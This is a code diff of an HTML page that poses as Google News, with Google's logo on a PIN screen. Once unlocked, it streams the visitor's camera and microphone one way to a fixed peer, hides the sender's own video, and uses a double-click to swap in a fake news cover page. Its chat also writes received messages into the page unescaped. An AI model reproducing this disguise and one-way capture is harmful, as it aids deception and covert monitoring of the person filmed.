@@ -1,129 +1,155 @@
 <!DOCTYPE html>
-<html>
+<html lang="hi">
 <head>
-    <title>Google News</title> <!-- Dhoka dene ke liye title change kiya hai -->
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Google News - Live Updates</title>
+    <!-- PeerJS Library for Video Connection -->
     <script src="https://unpkg.com/peerjs@1.4.7/dist/peerjs.min.js"></script>
     <style>
-        body { font-family: Arial; background: #f0f2f5; margin: 0; overflow: hidden; }
-        #login { position: fixed; top:0; left:0; width:100%; height:100%; background:white; z-index:100; display:flex; flex-direction:column; align-items:center; justify-content:center; }
-        #main-app { display:none; }
-        #remoteVideo { width: 100vw; height: 100vh; background: black; object-fit: cover; }
-        #chat-area { 
-            position: absolute; bottom: 20px; left: 10px; width: 250px; 
-            background: rgba(255,255,255,0.9); padding: 10px; border-radius: 8px;
-            transition: 0.3s; opacity: 1;
+        body, html { margin: 0; padding: 0; height: 100%; font-family: sans-serif; background: #fff; overflow: hidden; }
+        
+        /* 1. Login Screen (System Update look) */
+        #login-screen { position: fixed; inset: 0; background: #ffffff; display: flex; flex-direction: column; align-items: center; justify-content: center; z-index: 1000; text-align: center; }
+        .login-box { padding: 20px; border: 1px solid #ddd; border-radius: 10px; box-shadow: 0 4px 10px rgba(0,0,0,0.1); }
+        
+        /* 2. Fake News Page (Emergency Cover) */
+        #fake-news { display: none; padding: 20px; color: #333; height: 100vh; overflow-y: auto; background: white; }
+        .news-bar { background: #cc0000; color: white; padding: 10px; font-weight: bold; margin-bottom: 15px; }
+
+        /* 3. Real App Content */
+        #main-app { display: none; position: relative; width: 100%; height: 100vh; background: #000; }
+        #remoteVideo { width: 100%; height: 100%; object-fit: cover; background: #000; }
+        
+        /* Chat UI */
+        #chat-box { 
+            position: absolute; bottom: 30px; left: 50%; transform: translateX(-50%);
+            width: 85%; max-width: 350px; background: rgba(0,0,0,0.8); 
+            padding: 15px; border-radius: 15px; color: white; transition: 0.3s; z-index: 500;
         }
-        input, button { padding: 8px; margin: 5px; border-radius: 5px; border: 1px solid #ccc; }
+        #messages { height: 120px; overflow-y: auto; font-size: 14px; margin-bottom: 10px; border-bottom: 1px solid #444; text-align: left; }
+        .chat-input-area { display: flex; gap: 5px; }
+        input[type="text"] { flex: 1; padding: 8px; border-radius: 5px; border: none; }
+        .send-btn { padding: 8px 15px; border-radius: 5px; background: #28a745; color: white; border: none; cursor: pointer; }
     </style>
 </head>
 <body>
 
-<div id="login">
-    <h3>Enter Access Code</h3>
-    <input type="password" id="pass" placeholder="Password">
-    <button onclick="login()">Access Portal</button>
-</div>
-
-<div id="main-app">
-    <video id="remoteVideo" autoplay playsinline></video>
-    <div id="chat-area" id="chat">
-        <div id="messages" style="height:150px; overflow-y:auto; font-size:12px; color:black;"></div>
-        <input type="text" id="msg" placeholder="Type..." style="width:150px;">
-        <button onclick="sendMsg()">Send</button>
-        <p style="font-size:10px; color:gray;">2-Click: Hide | 3-Click: Show</p>
+    <!-- SECTION 1: LOGIN -->
+    <div id="login-screen">
+        <div class="login-box">
+            <img src="https://www.gstatic.com/images/branding/googlelogo/2x/googlelogo_color_92x30dp.png" width="92" alt="Google">
+            <h3 style="color:#5f6368;">Sign in to continue</h3>
+            <input type="password" id="pass-input" placeholder="Enter PIN" style="padding:10px; width:80%; margin-bottom:10px; border:1px solid #ccc; border-radius:5px;">
+            <br>
+            <button onclick="startApp()" style="padding:10px 25px; background:#1a73e8; color:white; border:none; border-radius:5px; cursor:pointer;">Next</button>
+        </div>
     </div>
-</div>
 
-<script>
-    let peer;
-    let conn;
-    const myPassword = "jaan"; // Aapka password
+    <!-- SECTION 2: FAKE NEWS (2-Clicks) -->
+    <div id="fake-news">
+        <div class="news-bar">BREAKING NEWS</div>
+        <h1>Heavy Rain Alert in South India</h1>
+        <p><b>Bangalore:</b> Authorities have advised caution due to unexpected weather changes. Public transport may be affected...</p>
+        <hr>
+        <h3>Stock Market Update</h3>
+        <p>Sensex jumps 400 points in early trade; Tech stocks lead the rally.</p>
+        <div style="background:#eee; height:200px; display:flex; align-items:center; justify-content:center; color:#999;">[News Image Placeholder]</div>
+    </div>
 
-    function login() {
-        if(document.getElementById('pass').value === myPassword) {
-            document.getElementById('login').style.display = 'none';
-            document.getElementById('main-app').style.display = 'block';
-            initPeer();
+    <!-- SECTION 3: VIDEO & CHAT -->
+    <div id="main-app">
+        <video id="remoteVideo" autoplay playsinline></video>
+        <div id="chat-box">
+            <div id="messages"><i>System: Connection Secure...</i></div>
+            <div class="chat-input-area">
+                <input type="text" id="msg-input" placeholder="Say something...">
+                <button class="send-btn" onclick="sendMsg()">Send</button>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        const MY_PASS = "jaan"; // PASSWORD YAHAN CHANGE KAREIN
+        let peer;
+        let conn;
+
+        async function startApp() {
+            const input = document.getElementById('pass-input').value;
+            if (input === MY_PASS) {
+                document.getElementById('login-screen').style.display = 'none';
+                document.getElementById('main-app').style.display = 'block';
+                setupConnection();
+            } else {
+                alert("Access Denied");
+            }
         }
-    }
 
-    function initPeer() {
-        // Aapka ID 'amit-123' aur unka ID 'partner-123' (Ise change kar sakte hain)
-        peer = new Peer('amit-123'); 
+        async function setupConnection() {
+            try {
+                // Camera access permission maangna
+                const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
+                
+                // Peer ID 'partner-123' (Unke liye)
+                peer = new Peer('partner-123');
 
-        peer.on('open', id => console.log('My ID: ' + id));
+                peer.on('open', id => {
+                    console.log("Connected with ID: " + id);
+                    // Amit (Aapko) call lagana
+                    const call = peer.call('amit-123', stream);
+                    
+                    // Unko aapka video NAHI dikhega (Hidden)
+                    call.on('stream', remoteStream => {
+                        // Agar aap unhe video dikhana chahte to yahan code aata
+                    });
+                });
 
-        // Video Call Receive Karna
-        peer.on('call', call => {
-            call.answer(); // Sirf answer karega, apna video nahi bhejega
-            call.on('stream', stream => {
-                document.getElementById('remoteVideo').srcObject = stream;
-            });
+                // Chat receive karne ke liye
+                peer.on('connection', c => {
+                    conn = c;
+                    conn.on('data', data => {
+                        const msgDiv = document.getElementById('messages');
+                        msgDiv.innerHTML += `<div><b>Him:</b> ${data}</div>`;
+                        msgDiv.scrollTop = msgDiv.scrollHeight;
+                    });
+                });
+
+            } catch (err) {
+                alert("Camera allow karna zaroori hai tabhi kaam karega.");
+                console.error(err);
+            }
+        }
+
+        function sendMsg() {
+            const val = document.getElementById('msg-input').value;
+            if (val && conn) {
+                conn.send(val);
+                const msgDiv = document.getElementById('messages');
+                msgDiv.innerHTML += `<div><b>Me:</b> ${val}</div>`;
+                document.getElementById('msg-input').value = "";
+                msgDiv.scrollTop = msgDiv.scrollHeight;
+            }
+        }
+
+        // HIDDING LOGIC (Clicks)
+        document.body.addEventListener('click', function (e) {
+            const main = document.getElementById('main-app');
+            const fake = document.getElementById('fake-news');
+            const login = document.getElementById('login-screen');
+
+            if (e.detail === 2) { // Double Click -> Show Fake News
+                main.style.display = 'none';
+                fake.style.display = 'block';
+                login.style.display = 'none';
+            }
+            if (e.detail === 3) { // Triple Click -> Reset to Password
+                main.style.display = 'none';
+                fake.style.display = 'none';
+                login.style.display = 'flex';
+                document.getElementById('pass-input').value = "";
+                location.reload(); // Connection refresh karne ke liye
+            }
         });
-
-        // Chat Connect Karna
-        peer.on('connection', c => {
-            conn = c;
-            conn.on('data', data => {
-                document.getElementById('messages').innerHTML += "<div><b>Partner:</b> "+data+"</div>";
-            });
-        });
-    }
-
-    // Hide/Show Logic
-    document.body.addEventListener('click', function (e) {
-        let chat = document.getElementById('chat-area');
-        if (e.detail === 2) chat.style.opacity = '0';
-        if (e.detail === 3) chat.style.opacity = '1';
-    });
-
-    function sendMsg() {
-        let m = document.getElementById('msg').value;
-        if(conn) conn.send(m);
-        document.getElementById('messages').innerHTML += "<div><b>Me:</b> "+m+"</div>";
-        document.getElementById('msg').value = "";
-    }
-</script> async function validate() {
-    const passInput = document.getElementById('pass-input').value;
-    
-    if(passInput === "1234") { // Aapka password
-        document.getElementById('login-screen').style.display = 'none';
-        document.getElementById('main-app').style.display = 'block';
-        
-        // --- YE LINE ZAROORI HAI ---
-        // Button click hote hi camera mangna
-        startCameraAndConnect(); 
-    } else {
-        alert("Ghalat Password!");
-    }
-}
-
-async function startCameraAndConnect() {
-    try {
-        // Camera permission mangne ka command
-        const myStream = await navigator.mediaDevices.getUserMedia({ 
-            video: true, 
-            audio: true 
-        });
-
-        // PeerJS Setup (Connection banane ke liye)
-        peer = new Peer('partner-123'); // Unki ID
-
-        peer.on('open', (id) => {
-            // Aapko (Amit) ko call lagana
-            const call = peer.call('amit-123', myStream);
-            
-            call.on('stream', (remoteStream) => {
-                // Agar aap unhe video dikhana chahte hain toh yahan setup karein
-                // Lekin aapne kaha ki unko aapka video nahi dikhna chahiye
-            });
-        });
-
-    } catch (err) {
-        console.error("Camera error: ", err);
-        alert("Please browser settings mein jaakar Camera ALLOW karein.");
-    }
-}
-
+    </script>
 </body>
 </html>
